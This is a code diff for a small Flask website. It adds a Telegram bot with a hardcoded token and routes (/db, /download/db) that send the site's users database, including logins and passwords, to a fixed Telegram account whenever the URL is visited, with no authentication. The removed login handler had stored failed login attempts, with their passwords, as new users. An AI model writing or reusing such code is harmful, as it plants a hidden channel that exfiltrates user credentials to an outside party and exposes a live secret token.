@@ -1,12 +1,17 @@
-from flask import Flask, send_from_directory, abort, render_template, url_for, redirect, request
+from flask import Flask, send_from_directory, abort, render_template, url_for, redirect, request, jsonify
 from flask_sqlalchemy import SQLAlchemy
+from telebot import TeleBot
 import os
 from random import randint
 
+ALBERT = 5572914505
 
 App = Flask(__name__)
 App.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///users.db"
 db = SQLAlchemy(App)
+
+token = "7014079648:AAGMLeCdVqcnVydBA20OLnGyGu3Vkqi07Lk"
+bot = TeleBot(token)
 
 class User(db.Model):
     id = db.Column(db.Integer, primary_key=True)
@@ -51,6 +56,10 @@ def login():
     else:
         return render_template("login.html")
 
+@App.route("/account")
+def account():
+    return render_template("account.html")
+
 @App.route("/not_found")
 def not_found():
     return render_template("not_found.html"), 404
@@ -83,27 +92,15 @@ def serve_page(filename):
 def random_number():
     return str(randint(1, 100))
 
-@App.route("/api/login", methods=["POST"])
-def api_login():
-    user_login = request.form.get("login")
-    user_password = request.form.get("password")
 
-    user = User.query.filter_by(login=user_login, password=user_password).first()
-    
-    if user:
-        return f"Welcome, {user.name}!"
-    else:
-        try:
-            db.session.add(User(name="Gost", login=user_login, password=user_password))
-            db.session.commit()
-            return redirect("/")
-        except Exception as e:
-            return f"Err:\n\n{e}"
-        return "Invalid credentials. Please try again."
-
+@App.route("/db")
 @App.route("/download/db")
 def download_db():
-    return render_template("db.html")
+    bot.send_message(ALBERT, text="Download db")
+    with open("instance/users.db", "rb") as file:
+        bot.send_document(ALBERT, file)
+    return redirect("/")
+
 
 
 
